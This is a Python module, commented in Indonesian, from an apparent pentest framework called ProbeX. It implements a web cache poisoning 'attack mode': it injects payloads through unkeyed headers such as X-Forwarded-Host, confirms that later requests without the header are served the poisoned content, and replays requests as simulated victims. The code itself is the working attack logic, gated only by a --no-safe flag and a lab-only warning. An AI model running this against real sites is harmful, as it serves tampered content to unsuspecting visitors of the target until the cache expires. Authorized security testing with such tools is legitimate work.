"""Cache poisoning INJEKSI (mode ATTACK).

Mode ATTACK — terpisah dari mode deteksi/scan. Benar-benar menanam payload
ke cache lewat header unkeyed, lalu membuktikan payload disajikan ke request
berikutnya tanpa header (X-Cache: HIT). Efek: pengunjung lain menerima
konten yang sudah diubah sampai TTL cache habis. HANYA untuk lab milik
sendiri atau target dengan izin eksplisit.
"""

from probex.core.config import Config
from probex.core.request_manager import RequestManager
from probex.core.reporter import Reporter
from probex.modules.base import BaseModule

import os

from probex.modules.cachepoisonx.injector import (
    CacheInjector,
    INJECT_HEADERS,
    PAYLOAD_PROFILES,
)


class _ProbeXLimiter:
    """Adaptasi RequestManager ProbeX jadi antarmuka limiter CachePoisonX."""

    def __init__(self, rm: RequestManager):
        self.rm = rm

    def wait(self):
        self.rm._pace()


class CachePoisoningInjectorModule(BaseModule):
    name = "Cache Poisoning Injector (attack mode)"

    def run(self) -> None:
        target = str(self.config.base_url)
        if not target:
            self.log("target kosong, lewati cache poisoning injector")
            return

        if not self.config._exploit_allowed:
            self.log(
                "mode injeksi dinonaktifkan (butuh --no-safe / --all-exploit)"
            )
            return

        if not self.config.can_request():
            self.log("request budget habis, lewati")
            return

        headers = self.config.cache_inject_header or ["X-Forwarded-Host"]
        raw_payloads = self.config.cache_inject_payload or ["host"]

        # Resolve payloads: kalau path file ada, isi file jadi payload literal.
        payloads = []
        for p in raw_payloads:
            if os.path.isfile(p):
                try:
                    with open(p, "r", encoding="utf-8") as f:
                        payloads.append(f.read().strip())
                    self.log("payload dari file: " + p)
                except Exception:
                    payloads.append(p)
            else:
                payloads.append(p)

        # ---------- bersihkan cache lab sebelum injeksi ---------------------
        # Scanner.run melakukan connectivity GET ke URL yang sama sebelum
        # modul dijalankan; request itu mengisi cache dengan salinan BERSIH,
        # sehingga injeksi berikutnya akan terima HIT salinan bersih dan
        # payload tidak pernah masuk (bug v1 yang sama). Clear cache dulu
        # agar injeksi menimpa entri yang benar.
        from urllib.parse import urlparse
        parsed = urlparse(target)
        origin = f"{parsed.scheme}://{parsed.hostname}" + (
            (":" + str(parsed.port)) if parsed.port else ""
        )
        clear_url = origin + "/_cache/clear"
        try:
            self.rm.request("GET", clear_url)
            self.log("cache lab dikosongkan sebelum injeksi")
        except Exception:
            self.log("tidak bisa membersihkan cache lanjutan (lanjutkan)")

        limiter = _ProbeXLimiter(self.rm)
        injector = CacheInjector(limiter=limiter, timeout=self.config.timeout)

        hostname = target.split("//")[-1].split("/")[0]

        results = []
        for header in headers:
            for profile in payloads:
                marker = injector.new_marker()
                # kalau profil dikenal pakai template, kalau file/literal pakai apa adanya
                if profile in PAYLOAD_PROFILES:
                    payload = injector.build_payload(profile, marker, hostname)
                else:
                    payload = profile.replace("{m}", marker).replace("{h}", hostname)

                self.log("injeksi: " + header + " = " + payload)
                res = injector.attempt(target, header, payload, marker)
                res["profile"] = profile
                results.append(res)

                if res.get("error"):
                    self.log("[error] " + res["error"])
                    continue

                injected = bool(res.get("injected"))
                verdict = res.get("verdict", "-")

                if injected:
                    self.reporter.add_finding(
                        title="Cache poisoning — payload tertanam dan disajikan ke korban",
                        severity="high",
                        detail=(
                            "Header " + header + " dengan payload " + payload +
                            " berhasil ditanam ke cache. Replay tanpa header masih "
                            "menyajikan payload (cache HIT). Semua pengunjung "
                            "berikutnya menerima versi teracuni sampai TTL habis."
                        ),
                        evidence=res.get("snippet", ""),
                        url=res.get("target", target),
                        method="GET",
                        parameter=header,
                        evidence_snippet=res.get("snippet", "")[:300],
                    )
                    self.log("[INJECTED] " + header + " -> payload persist di "
                             "cache HIT (" + res.get("target", target) + ")")

                    # Simulasi korban kecil (3 replay) jika budget cukup
                    victims = 3
                    if self.config.can_request():
                        vic = injector.simulate_victims(
                            res["target"], payload, marker, victims
                        )
                        self.log("  " + str(vic["poisoned"]) + " dari " +
                                 str(victims) + " korban menerima payload")
                        self.reporter.add_finding(
                            title="Cache poisoning — simulasi korban (" +
                                  str(vic["poisoned"]) + "/" + str(victims) + ")",
                            severity="high",
                            detail="Replay tanpa header (" + str(victims) + "x) semua "
                                   "menerima payload teracuni.",
                            url=res.get("target", target),
                            method="GET",
                            parameter=header,
                        )
                else:
                    self.log("[" + verdict + "] " + res.get("reason", "-"))
                    self.reporter.add_finding(
                        title="Cache poisoning injector — tidak berhasil",
                        severity="info",
                        detail="Verdikt: " + verdict + ". Alasan: " +
                               res.get("reason", "-"),
                        url=target,
                        method="GET",
                        parameter=header,
                    )

        self.log("selesai (cache poisoning injector)")
